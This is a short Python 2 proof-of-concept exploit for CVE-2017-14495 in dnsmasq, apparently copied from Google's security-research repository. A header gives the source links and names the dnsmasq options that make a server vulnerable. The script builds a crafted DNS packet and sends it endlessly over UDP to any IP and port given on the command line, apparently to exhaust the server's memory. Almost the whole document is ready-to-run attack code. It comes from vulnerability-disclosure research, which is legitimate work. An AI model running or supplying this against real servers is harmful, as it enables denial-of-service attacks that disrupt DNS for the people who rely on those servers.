'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14495.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

dnsmasq is vulnerable only if one of the following option is specified: --add-mac, --add-cpe-id or --add-subnet.

'''

#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwin <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import socket
import sys


def oom():
  data = '''01 0d 08 1b 00 01 00 00  00 00 00 02 00 00 29 04
00 00 29 00 00 00 03 00  00 01 13 00 08 01 13 79
00 00 00 00 00
  '''.replace(' ', '').replace('\n', '').decode('hex')
  data = data.replace('\x00\x01\x13\x00', '\x7f\x00\x00\x01')
  return data

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  packet = oom()

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST, 1)
  while True:
    s.sendto(packet, (ip, port))
    #break
  s.close()